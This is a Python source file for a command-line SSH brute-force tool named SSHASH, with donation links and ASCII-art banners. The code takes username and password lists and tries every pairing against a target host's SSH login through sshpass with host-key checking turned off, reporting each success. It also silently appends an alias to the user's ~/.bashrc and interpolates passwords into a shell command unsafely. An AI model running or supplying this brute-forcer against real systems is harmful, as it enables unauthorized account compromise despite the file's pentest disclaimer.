 ##################################################################
 # WARNING: This Tool Is Made For Pentesters And Ethical Purposes #
 ##################################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# ----------------------------------------
# Youtube: TrabbitOne
# BuyMeACoffee: trabbit0ne
# Bitcoin: bc1qehnsx5tdwkulamttzla96dmv82ty9ak8l5yy40
# ----------------------------------------
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# ----------------------------------------
# SSH Brute Forcing Software
# Author: Trabbit
# Date: 2024-07-18
# ----------------------------------------
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#!/usr/bin/env python3

import os
import sys
import time
import signal
import shutil
import subprocess
from argparse import ArgumentParser

# Clear function
def clear_screen():
    os.system("clear")

# Configurations
alias_to_add = 'alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'
bashrc_path = os.path.expanduser("~/.bashrc")

def add_alias_to_bashrc():
    with open(bashrc_path, 'r') as file:
        if alias_to_add not in file.read():
            with open(bashrc_path, 'a') as bashrc_file:
                bashrc_file.write(f"\n{alias_to_add}\n")
            subprocess.run(["source", bashrc_path], shell=True)
            print("Alias added to ~/.bashrc")
            time.sleep(0.5)
            os.system('clear')

def install_package(package_name):
    if package_name == "dnsutils":
        if sys.platform == "darwin":
            subprocess.run(["brew", "install", "bind"], check=True)
        elif sys.platform == "linux":
            subprocess.run(["sudo", "apt-get", "install", "-y", package_name], check=True)
        elif "android" in os.uname().release.lower():
            subprocess.run(["pkg", "install", package_name], check=True)
        else:
            print("System not supported!")
            sys.exit(1)
    elif package_name == "sshpass":
        if sys.platform == "darwin":
            subprocess.run(["brew", "install", package_name], check=True)
        elif sys.platform == "linux":
            subprocess.run(["sudo", "apt-get", "install", "-y", package_name], check=True)
        elif "android" in os.uname().release.lower():
            subprocess.run(["pkg", "install", package_name], check=True)
        else:
            print("System not supported!")
            sys.exit(1)

def check_installations():
    if not shutil.which("nslookup"):
        print("[i] Installing nslookup...")
        install_package("dnsutils")
    if not shutil.which("sshpass"):
        print("[i] Installing sshpass...")
        install_package("sshpass")

def signal_handler(sig, frame):
    print("\nOperation aborted by the user.")
    sys.exit(0)

def test_ssh_password(username, password, port, host):
    ssh_command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {username}@{host} 'exit'"
    result = subprocess.run(ssh_command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"SSH Login Successful - {username}:{password} [\033[42mSUCCESS\033[0m]")
    else:
        print(f"SSH Login Failed - {username}:{password} [\033[41mFAIL\033[0m]")

def display_banner():
    print("""
                               ›—zÇGÅggÞ66Þí                  
                             zÏgÅgggÞ6Ï{›{ügÇ—                
                            zggÅÅÅÅÅÇüGGÇÏízüg{               
                            {ÅÅÅÅÅÅÅÅgggGGg6ÞÅGz›             
                            zÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÇüÞ—              
                            ›ÅÅÅÅÅÅÅÅÅÅÅÅÅü{ÞÇÇ               
                             ÞÅÅÅÅÅÅÅÅÅÅÅÅí›ÞÅÏ               
                            ÏÅÅÅÅÅÅÅÅÅÅÅÅÅÅÞÏÞÏ{              
                            ÏÅÅÅÅÅÅÅÅÅ6ÅÅgÏ›—üG{              
                             ÇÅÅÅÅÅÅÅg{ÏÅÅÅÇígÏ               
                              {GÅÅÅÅÅÅÞ6ÅÅÅ6{›                
                              {GÅÅÅÅÅÅÇ{Gí—Þ{›                
                            —ÇÅÅÅÅÅÅÅÅÅggü›zÇgü›              
                          ›üÅÅggÅÅÅÅÅÅÅgz—gü6ÅÅgz             
                        ›ÏgÅÅÅÇígÅÅÅÅgGGGÅÅÏ—gÅÅÅGí           
                       zÅÅÅÅÅÅü  ügÅÅÅÅÅÅgz  GÅÅÅÅÅÅ—         
                     í6GÅÅÅÅÅÅÇ›   {6gGü—   ›gÅÅÅÅÅÅGü—       
                  —GÅÅÅÅÅÅÅÅÅÅgí  zgÅÅÅÅG{  üÅÅÅÅÅÅÅÅÅÅÅ6›    
                 ›zÞÅÅÅÅÅÅÅÅÅÅÅgÏÞízgÅÅgízG6ÅÅÅÅÅÅÅÅÅÅÅÅÇí    
                     {GÅÅÅÅÅÅÅÅÅÅ—  üÅgz  {ÅÅÅÅÅÅÅÅÅÅÇ—       
                        íÇgÅÅÅÅÅÅgí›ÅgGÇ›ÏÅÅÅÅÅÅÅg6—          
                           —6ÅÅÅÅÅÅgÅÅÅÅgÅÅÅÅÅgÏ›             
                              —ügÅÅÅÅÅÅÅÅÅÅGÏ›                
                                 —ÏgÅÅÅÅGýz›                  
                                   ›zíiúiÿ<                   

                             DEVELOPED BY TRABBIT          
                          __. __..  ..__. __..  .  
                         (__ (__ |__|[__](__ |__|  
                         .__).__)|  ||  |.__)|  |  

                    * SSHASH CONNEXION BRUTE FORCER *   
           {>===============================================<}
    """)

def display_usage():
    print("""
   __. __..  ..__. __..  .  
  (__ (__ |__|[__](__ |__|  
  .__).__)|  ||  |.__)|  |  
  ------------------------  
  \033[41mSSH CONNECTION BRUTEFORCER \033[0m

 |R.C.S.A.| RAPS CYBER SECURITY AGENCY.
  WARNING: DO NOT USE FOR ILLEGAL/UNETHICAL PURPOSES.

Usage: sshash -u <user_file> -t <target> -p <port> -l <password_file>

Options:
 -u users_file
 -t target <ip or url>
 -p port
 -l password_list

Examples:
 sshash -u usernames.txt -t https://example.com -p 22 -l passwords.txt
 sshash -u usernames.txt -t 192.168.123.32 -p 80 -l passwords.txt
 sshash -u users.txt -t https://example.com -l passwords.txt
""")

class CustomArgumentParser(ArgumentParser):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.register('action', 'help', CustomHelpAction)

    def error(self, message):
        display_usage()
        self.exit(2)

class CustomHelpAction:
    def __init__(self, option_strings, dest, nargs=0, **kwargs):
        self.option_strings = option_strings
        self.dest = dest
        self.nargs = nargs

    def __call__(self, parser, namespace, values, option_string=None):
        display_usage()
        parser.exit()

def main():
    clear_screen()
    parser = CustomArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show this help message and exit')
    parser.add_argument("-u", "--users", required=True, help="Path to the file containing the list of usernames")
    parser.add_argument("-t", "--target", required=True, help="Target IP or URL")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-l", "--passwords", required=True, help="Path to the file containing the list of passwords")
    args = parser.parse_args()

    if args.help:
        display_usage()
        sys.exit(0)

    # Add alias to bashrc if not present
    add_alias_to_bashrc()

    # Check and install necessary packages
    check_installations()

    # Display banner
    display_banner()

    # Load user and password lists
    with open(args.users, 'r') as user_file:
        users = [line.strip() for line in user_file.readlines()]

    with open(args.passwords, 'r') as password_file:
        passwords = [line.strip() for line in password_file.readlines()]

    # Start brute force attack
    print(f"           --{{[+]TARGET}} =>", args.target)
    print(f"           --{{[+]PORT}} =>", args.port)
    print(f"           --{{[+]USERLIST}} => {os.path.basename(args.users)}")
    print(f"           --{{[+]PASSLIST}} => {os.path.basename(args.passwords)}")
    print()
    print("           {>===============================================<}")
    print("                      //BRUTEFORCE ATTACK STARTED//     ")
    print("           {>===============================================<}")
    print("            ", end="")
    for _ in range(49):
        time.sleep(0.01)
        print("*", end="")
    print()

    for user in users:
        for password in passwords:
            print("            ", end="")
            test_ssh_password(user, password, args.port, args.target)

    print("           {>===============================================<}")
    print("                                   Done.                 ")
    print("           {>===============================================<}")
    print()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
